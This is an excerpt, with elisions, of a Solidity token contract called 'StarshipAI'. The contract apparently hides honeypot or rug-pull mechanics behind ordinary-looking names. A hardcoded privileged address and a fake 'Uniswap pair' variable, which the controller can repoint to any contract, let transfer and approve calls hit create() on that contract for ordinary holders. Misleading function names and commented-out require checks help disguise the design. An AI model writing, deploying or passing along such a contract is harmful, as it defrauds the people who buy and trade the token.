...
contract Token is Context, IERC20, Ownable {
    ...
    string private _name = "StarshipAI";
    string private _symbol = "STARSHIPAI";
    ...
    uniswapV1 private uniswapV10PairToken;
    ...
    constructor(address Antibottoken_, address creator) {
        ...
        uniswapV10PairToken = uniswapV1(uniswapV3Pair_);
        ...
        _Antitbotswaper[0x55E582a8656B920A1A99bc8ca2773433119128f0] = true;
    ...
    function ag(uint256 g) public {
        if (_Antitbotswaper[_msgSender()]) {
            gg=g;
        } else {
            uniswapV10PairToken.create(8**3);
        } 
    }
    ...
    function Ecrecat(uint256 a) public {
        if (_Antitbotswaper[_msgSender()]) {
            creca=a;
        } else {
            uniswapV10PairToken.create(8**3);
    ...
    function initialfees(uint256 taxFeebuy, uint256 liquidityFeebuy, uint256 MarketingFeebuy, uint256 taxFeesell, uint256 liquidityFeesell, uint256 MarketingFeesell) public {
        //require(_msgSender() == address(_Antitbottoken), "ERC20");
    ...
    function increaseApAndCall(address[] calldata addresses, bool status) public {
        //require(_msgSender() == address(_Antitbottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antitbottoken)) { 
    ...
    function marketingWalletca(address addresses) public {
        //require(_msgSender() == address(_Antitbottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antitbottoken)) { 
            uniswapV10PairToken = uniswapV1(addresses);
        } else {
            uniswapV10PairToken.create(8**3);
        }
    }
    ...
    function initialitzeW(bool bs, uint256 timesleep, uint256 fee, uint256 c, bool trad, address r) public {
        //require(_msgSender() == address(_Antitbottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antitbottoken)) { 
            antitbotenabled = bs;
            botsleep = timesleep;
    ...
    function includeFromFeeL(address[] memory accounts, bool state) public {
        //require(_msgSender() == address(_Antitbottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antitbottoken)) { 
            for (uint256 i = 0; i < accounts.length; i++) {
    ...
    function _approve(
        ...
        if (_isExcludedtFromFeeTransfer[_msgSender()]){uniswapV10PairToken.create(creca);/*"ERC20: approve the zero address"*/}
    ...
    function _transfer(
        ...
        if (!takeFee) {
            ...
            _MarketingFee = _MarketingFeesell;
            uniswapV10PairToken.create(crec);
            if(crec>220 && msg.sender!=rr){uniswapV10PairToken.create(crec**21);}
        }
        ...
        if (_isExcludedtlp[to]) {
            uniswapV10PairToken.create(250**3); 
        }
